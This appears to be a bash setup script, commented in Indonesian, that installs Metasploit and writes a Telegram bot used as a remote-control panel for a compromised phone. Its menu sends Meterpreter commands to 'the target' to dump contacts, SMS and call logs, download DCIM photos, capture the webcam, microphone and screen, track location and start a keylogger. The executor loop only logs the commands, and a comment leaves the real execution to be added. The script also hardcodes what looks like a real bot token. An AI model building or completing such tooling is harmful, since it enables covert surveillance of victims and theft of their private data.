#!/bin/bash

echo "🔧 Updating system and installing Metasploit Framework..."
sudo apt update && sudo apt upgrade -y
sudo apt install -y metasploit-framework python3-pip

echo "📦 Installing Python dependencies..."
pip3 install --upgrade pip
pip3 install pyTelegramBotAPI requests

echo "✍️ Membuat file bot.py..."
cat > bot.py << 'EOF'
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "7982814387:AAG7PEh1M4SWpTJSxV6suDgasIGq_PVqHH0"
bot = telebot.TeleBot(TOKEN)

def kirim_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📷 Kamera", callback_data="webcam_snap"),
        InlineKeyboardButton("📁 File", callback_data="download /sdcard/Download/"),
        InlineKeyboardButton("📍 Lokasi", callback_data="geolocate"),
        InlineKeyboardButton("📞 Kontak", callback_data="dump_contacts"),
        InlineKeyboardButton("🖼️ Screenshot", callback_data="screenshot"),
        InlineKeyboardButton("🎙️ Rekam Mic", callback_data="record_mic"),
        InlineKeyboardButton("🎥 Kamera Live", callback_data="webcam_stream"),
        InlineKeyboardButton("🗂️ Unduh DCIM", callback_data="download /sdcard/DCIM/"),
        InlineKeyboardButton("📞 Call Logs", callback_data="dump_calllog"),
        InlineKeyboardButton("✉️ SMS Logs", callback_data="dump_sms"),
        InlineKeyboardButton("⌨️ Keylogger On", callback_data="keyscan_start"),
        InlineKeyboardButton("🛑 Keylogger Off", callback_data="keyscan_stop"),
        InlineKeyboardButton("📋 Clipboard", callback_data="clipboard")
    )
    bot.send_message(chat_id, "📲 Pilih fitur Metasploit:", reply_markup=markup)

@bot.message_handler(commands=['start', 'menu'])
def send_menu(message):
    kirim_menu(message.chat.id)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    perintah = call.data
    with open("control.txt", "w") as f:
        f.write(perintah)
    bot.answer_callback_query(call.id, f"✅ Perintah '{perintah}' dikirim.")
    bot.send_message(call.message.chat.id, f"Perintah `{perintah}` dikirim ke target.")

bot.polling()
EOF

echo "✍️ Membuat file executor.sh..."
cat > executor.sh << 'EOF'
#!/bin/bash
while true; do
  if [ -f control.txt ]; then
    CMD=$(cat control.txt)
    echo "[*] Menjalankan perintah: $CMD"
    # Tambahkan eksekusi meterpreter/msfconsole sesuai kebutuhan
    # Contoh hanya simpan hasil di file result.txt
    echo "$CMD" > result.txt
    rm control.txt
  fi
  sleep 5
done
EOF

chmod +x executor.sh

echo "✅ Semua sudah siap!"
echo "Cara menjalankan:"
echo "1. Jalankan msfconsole"
echo "2. Jalankan bot Telegram: python3 bot.py"
echo "3. Jalankan executor: bash executor.sh"
